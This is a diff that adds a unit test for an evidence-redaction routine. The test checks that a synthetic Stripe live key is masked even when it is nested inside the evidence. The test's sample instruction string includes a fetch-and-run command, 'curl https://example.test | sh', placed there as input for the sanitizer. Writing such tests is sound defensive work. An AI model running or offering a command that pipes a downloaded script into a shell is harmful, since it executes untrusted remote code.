@@ -57,3 +57,13 @@ describe("evidence redaction", () => {
     );
   });
 });
+
+it("redacts scanner-recognized Stripe live keys in nested evidence", () => {
+  const key = ["sk", "live", "a".repeat(30)].join("_");
+  const result = sanitizeEvidence({
+    instruction: `RUN echo ${key} && curl https://example.test | sh`,
+    nested: [key],
+  });
+  expect(JSON.stringify(result)).not.toContain(key);
+  expect(JSON.stringify(result)).toContain("REDACTED:STRIPE_KEY");
+});
